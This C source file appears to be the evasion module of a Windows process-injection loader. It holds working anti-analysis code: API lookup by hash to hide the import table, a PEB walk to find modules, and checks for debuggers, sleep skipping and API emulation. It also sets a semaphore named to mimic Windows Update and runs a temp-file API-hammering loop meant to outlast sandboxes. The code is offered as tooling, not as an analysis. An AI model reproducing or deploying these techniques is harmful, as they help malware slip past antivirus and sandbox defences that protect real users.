#include "Evasion.h"
#include "RemoteMappingInjection-Evasion.h"

#define NtCurrentProcess() ((HANDLE)-1) //Pseudo handle
#define TMPFILE L"D34DD34D.tmp" //API Hammering temporary file
#define CYCLES ((DWORD)5000) //30 sec on R7 3700X

//djb2 for unicode
DWORD HashStringDjb2A(PBYTE String) {
	ULONG Hash = 0xDEADC0DE;
	INT c;
	while (c = *String++)
		Hash = ((Hash << 0x5) + Hash) + c;
	return Hash;
}

// widechar variant
DWORD64 HashStringDjb2W(PWSTR str) {
	DWORD64 dwHash = 0xDEADC0DE;
	INT c;
	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;
	return dwHash;
}

FARPROC NotGetProcAddress(IN HMODULE hModule, IN DWORD ApiHash) {

	PBYTE pBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);

	IMAGE_OPTIONAL_HEADER ImgOptHdr = pNtHeader->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD pNameRvas = (PDWORD)(pBase + pExportDir->AddressOfNames);
	PDWORD pAddrRvas = (PDWORD)(pBase + pExportDir->AddressOfFunctions);
	PWORD pOrdinals = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++) {
		CHAR* pFuncName = (CHAR*)(pBase + pNameRvas[i]);
		PVOID pFuncAddr = (PVOID)(pBase + pAddrRvas[pOrdinals[i]]);

		if (ApiHash == HASH_ANSI(pFuncName)) {
			return pFuncAddr;
		}
	}

	return NULL;
}


HMODULE NotGetModuleHandle(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {
		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {
			CHAR UpperCaseDllName[MAX_PATH];
			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';
			if (HASH_ANSI(UpperCaseDllName) == dwModuleNameHash)
				return pDte->Reserved2[0];
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}
	return NULL;
}


int CheckSleepForwarding() {
	DWORD startTime = GetTickCount();
	Sleep(2000);
	double elapsedTime = (GetTickCount() - startTime) / 1000.0;
	return (elapsedTime < 1.5) ? -1 : 0;
}

int CheckDebuggerPresence(fnIsDebuggerPresent pIsDebuggerPresent) {
	return pIsDebuggerPresent() ? -2 : 0;
}

int CheckApiEmulation1(fnFlsAlloc pFlsAlloc) {
	return (pFlsAlloc(0) == NULL) ? -3 : 0;
}

int CheckApiEmulation2(fnVirtualAllocExNuma pVirtualAllocExNuma) {
	return (pVirtualAllocExNuma(NtCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0) == NULL) ? -4 : 0;
}

int CheckExecControl() {
	HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "wuauctl");
	return (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS) ? -5 : 0;
}

int APIHammering(DWORD dwStress) {
	WCHAR szPath[MAX_PATH * 2], szTmpPath[MAX_PATH];
	DWORD dwNumOfBytesRead = NULL, dwNumOfBytesWritten = NULL;
	PBYTE pRandBuff = NULL;
	SIZE_T sBuffSize = 0xFFFFF; // 1048575 bytes size
	INT Rand = 0;

	HANDLE hReadFile = INVALID_HANDLE_VALUE;
	HANDLE hWriteFile = INVALID_HANDLE_VALUE;

	// Get tmp folder path
	if (!GetTempPathW(MAX_PATH, szTmpPath)) {
		return -6;
	}

	// construct file path
	wsprintfW(szPath, L"%s%s", szTmpPath, TMPFILE);

	for (SIZE_T i = 0; i < dwStress; i++) {
		// Create file in write mode
		if ((hWriteFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
			return -7;
		}

		// allocate buffer and fill it with random data
		pRandBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
		srand(time(NULL));
		Rand = rand() % 0xFF;
		memset(pRandBuff, Rand, sBuffSize);

		// write random data into file
		if (!WriteFile(hWriteFile, pRandBuff, sBuffSize, &dwNumOfBytesWritten, NULL) || dwNumOfBytesWritten != sBuffSize) {
			return -8;
		}

		// clear the buffer
		RtlZeroMemory(pRandBuff, sBuffSize);
		CloseHandle(hWriteFile);

		// opne file in read mode and delete when it is done
		if ((hReadFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
			return -9;
		}

		// read the random data from the file
		if (!ReadFile(hReadFile, pRandBuff, sBuffSize, &dwNumOfBytesRead, NULL) || dwNumOfBytesRead != sBuffSize) {
			return -10;
		}

		// clean up
		RtlZeroMemory(pRandBuff, sBuffSize);
		HeapFree(GetProcessHeap(), NULL, pRandBuff);
		CloseHandle(hReadFile);
	}
	// all ok
	return 0;
}

//IAT Hiding - functions
int InitEvasion() {
	fnVirtualAllocExNuma pVirtualAllocExNuma;
	fnFlsAlloc pFlsAlloc;
	fnIsDebuggerPresent pIsDebuggerPresent;

	pVirtualAllocExNuma = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_VIRTUALALLOCEXNUMA);
	pFlsAlloc = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_FLSALLOC);
	pIsDebuggerPresent = NotGetProcAddress(NotGetModuleHandle(H_MOD_KERNEL32), H_FUNC_ISDEBUGGERPRESENT);

	if (CheckSleepForwarding() < 0) return -1;
	if (CheckDebuggerPresence(pIsDebuggerPresent) < 0) return -2;
	if (CheckApiEmulation1(pFlsAlloc) < 0) return -3;
	if (CheckApiEmulation2(pVirtualAllocExNuma) < 0) return -4;
	if (CheckExecControl() < 0) return -5;
	// 5000 cycles
	if (APIHammering(CYCLES) != 0) return -6;
}
